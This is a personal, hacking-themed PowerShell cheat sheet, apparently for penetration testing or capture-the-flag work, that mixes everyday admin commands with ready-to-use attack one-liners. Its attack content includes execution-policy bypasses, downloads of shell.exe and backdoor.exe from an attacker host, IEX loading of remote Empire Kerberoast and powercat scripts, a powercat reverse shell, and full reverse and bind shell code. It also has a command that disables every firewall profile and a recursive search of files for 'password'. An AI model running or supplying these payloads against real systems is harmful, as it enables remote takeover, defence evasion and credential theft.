# Useful Powershell
This is a condensed and *Hacking themed* resource for powershell. Powershell is a massive and my humble opinion a *weird* object-oriented programming language.  Windows and Powershell are not case-sensitive, but a *stardard* readability is to use upper-case first letter - I suggest not unless you need to present your work(use a script to change it to *standard*). Every command has a cmdlet and combinations of `verb-noun` to construct command that would be too numerous to list. So to define the theme of this document is oneliners catergorised by use(*just in case at some point they maybe some exceptions like two oneliners that need to be seperate executions* **THESE WILL HAVE A `# TASKNAME Command # THEN Command`**. I am in the process of making this better for my own use:
1. Adding aliases that I might want to use instead of full command
2. Making the comments defining explaining a better layout

For all the [[Powershell-Verbs]].

## Execution policy bypass And Versioning 
```powershell
powershell -ep bypass
powershell.exe -exec bypass C:\Wowsershell.ps1
$PSVersionTable
```

## File transfers
```powershell
(New-Object system.Net.WebClient).Downloadfile('http://ATTACKBOX_IP/shell.exe')

certutil -urlcache -split -f http://$ATTACKBOX_IP/backdoor.exe


iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')

Invoke-WebRequest -Uri http://$ATTACKBOX_IP -OutFile file.exe

# http.server 8888 in powercat directory
# nc -lvnp 1337
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"

# One line NC web server
# REQUIRES NETCAT on target!
while(1) { cat index.html | nc -w1 -l -p 8080 }

# HARDCORE GUI way:
# Add ip to trusted sites and download
# 
```
[Add to trusted sites with powershell](https://stackoverflow.com/questions/51720030/ie-browser-powershell-script-to-add-site-to-trusted-sites-list-disable-protec)

## General
```powershell
Get-Command              # list of powershell commands, BEWARE OF THE LISTS
Get-Verb				 # list all verbs
Get-Help                 # help for specific cmdlet
Get-Help $Command-Name
Get-Command Verb-* 
Get-Command *-Noun # Commands and Cmdlets are both executables in ps, Command= compiled, can be solo-executed cmdlets
Get-Command | Get-Member -MemberType Method # view members for a the get command
Get-Command -Type Cmdlets | Measure-Object -Sum -ErrorAction SilentlyContinue
Get-Alias		
Set-Alias				 	# Make commands
Set-Alias -Name helpmeplease -Value Get-help

```

## Providers and Modules
```powershell
# A provider is .NET program to access data stores
# Typically included in modules and are accessible after the module has been loaded into the current session
Get-PSProvider

# Modules are packages that contain additional cmdlets, functions, providers, etc that an be imported into the current session
Get-Module 
Get-Module -ListAvailable
Get-Command -Module Defender	# Return all functions of a module
```

## System Information
```powershell
Get-HotFix -ID
$PSVersionTable.PSVersion
Get-History							# Get command history
Clear-History						# Use with care and permission
Get-ChildItem ENV:      # Display all environment variables
```

## Software Information
```powershell
Get-ExecutionPolicy			
Set-ExecutionPolicy -RemoteSigned	# -Flags -Name -ListAvailable

```

## Network information
```powershell
# wmi-object in win10 are good tool to find safest lateral movement  
Get-WmiObject Query Select from Win32_NetworkAdapterConfiguration | Where-Object Index = $device_number
(Get-NetIPAddress | Where-Object InterfaceAlias -eq "Local Area Connection").IPv4Address | select -first 1).gettype().fullname
# Local smbshare information
Get-SmbShare
```

## Objects 
```powershell
Select-Object -Property Mode, Name
-first 	# gets the first x object
-last 	# gets the last x object
-unique # shows the unique objects
-skip   # skips x objects
Where-Object # Filter through objects
```

## Strings
```powershell
Select-String "..." -List  # CAREFUL WHERE YOU RUN it relative to working directory location!
Select-String $String -context 10,10			# Findstr but get the ten lines previous and after match VERY HANDY with sysinternals
Get-ChildItem C:\ -Recurse | Select-String -Pattern "password"
```

## Maths, Counting and Measuring
```powershell
Measure-Object -Sum -ErrorAction SilentlyContinue
```

## File and Directory interactions
```powershell
## Reading and Writing ##
Get-Content							  # Reading file
Get-Content -Path .\filename.FILETYPE # -Raw for raw file output

Set-Content 		# Writing to files
Expand-Archive -Path .\*.zip -DestinationPath C:\Destination # Expand a zip file

Get-Location        # print working directory
Set-Location 		# choose a directory for context to operate

## File Hashing and checksums ##
# FILTERHASHTABLE 101:
# Levels:
# NAME            VALUE
# verbose         5
# informational   4
# warning         3
# error           2
# critical        1
# logalways       0 
# FOR EXAMPLE:
Get-FileHash -Path ... -Algorithm
CertUtil -hashfile [FILE] MD5|SHA256|SHA512
## Finding ##
Get-ChildItem # Aliased ls, dir, gci
Get-ChildItem -Hidden
Get-ChildItem -Path C:\ -Include *.doc,*.[FILETYPE] -File -Recurse -ErrorAction SilentlyContinue #Find all finds of a particular filetype:
Get-ChildItem –Path C:\ -Include *HSG* -Exclude *.JPG,*.MP3,*.TMP -File -Recurse -ErrorAction SilentlyContinue # Find all find that include *"..."* BUT also exclude wildcard.Filetype
Get-Childitem -Path C:\ -Recurse # Display pdirectory listing under a parent file, flag: recursive for recursive directory scrapping
Get-Acl # Get owner of directory again careful of relative running from another directory

Where-Object # TODO
Import-CSV file.csv     # Read a CSV file
```

## Processes tasks and scheduled tasks
```powershell
Get-Process
Get-Process -ID $PID -IncludeUserName # Owner of proccess
Get-Process -ID $PID | Format-Table * # All data on a PID
# Get parent process
Get-CimInstance -className win32_process | where-object {$_.ProcessId -eq processId_goes_here } | select ParentProcessId, Name 

# Scheduled Tasks
schtasks
schtasks /query /fo /LIST /v
Get-ScheduledTask [-Taskname] [-TaskPath]

##  Sofware ##
# Change executionpolicy
Get-ExecutionPolicy
Set-ExecutionPolicy bypass -scope process
```

## Services
```powershell
# Display all the Automatic StartType Services
Get-Service | Select-Object -Property ServiceName,DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object {$_.StartType -EQ "Automatic" -And $_.ServiceName -Match "^s"} | Format-Table
```

## Registery
```powershell
# Making a new registery key
cd HKLM:
New-Item myKey
New-ItemProperty -Path .\myKey\ -Name Test -Type DWORD -Value 1
```

## Networking
```powershell
# Test connection
Test-NetConnection -ComputerName 127.0.0.1 -Port 80
# Check the test connection with:
(New-Object System.Net.Sockets.TcpClient("127.0.0.1", "80")).Connected

netstat -noa |findstr "LISTENING" |findstr "PORTNUMBER"                 # Find process port

# nslookup.exe for dc enumeration within a network
nslookup.exe
server ip
ls -d domainname
```

## Host Security Detection
```powershell
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct     # Windows servers may not have SecurityCenter2
Get-Service WinDefend
Get-MpComputerStatus                                                            # Get the status of security solution elements
Get-MpThreat                                                                    # History of detected threats
Get-NetFirewallProfile | Format-Table Name, Enabled                             # Firewall details
Get-NetFirewallRule | select DisplayName, Enabled, Description                  # Show all enable firewall rules
Get-NetFirewallRule | findstr "rulename"                                        # Find specific rule with findstr
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False          # disable a firewall
```

## Active Directory
```powershell
# Certain Privileges!
Get-ADUser -Filter *
Get-ADUser -Filter * -SearchBase "CN=Admin,OU=THM,DC=redteam,DC=com" # CN=Common Name, DC=Domain Component, OU=OrganizationalUnitName, et
Get-ADForest | Select-Object Domains
Get-ADDomain | Select-Object NetBIOSName, DNSRoot, InfrastructureMaster
Get-ADTrust -Filter * | Select-Object Direction,Source,Target
Get-NetDomain
Get-NetDomainController
Get-NetForest
Get-NetDomainTrust
```

## Certificates
```powershell
Get-ChildItem -Path cert:\LocalMachine
```

## Powershell Reverse Shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1337);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```
Enclose with:
```powershell
 powershell -c "<code>"
```
For the one liner

## Powershell Bind Shell
Remember to change local addresss accordingly, some localhosts won't be `0.0.0.0`
```powershell
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()
```
Enclose with:
```powershell
 powershell -c "<code>"
```
For the one liner.
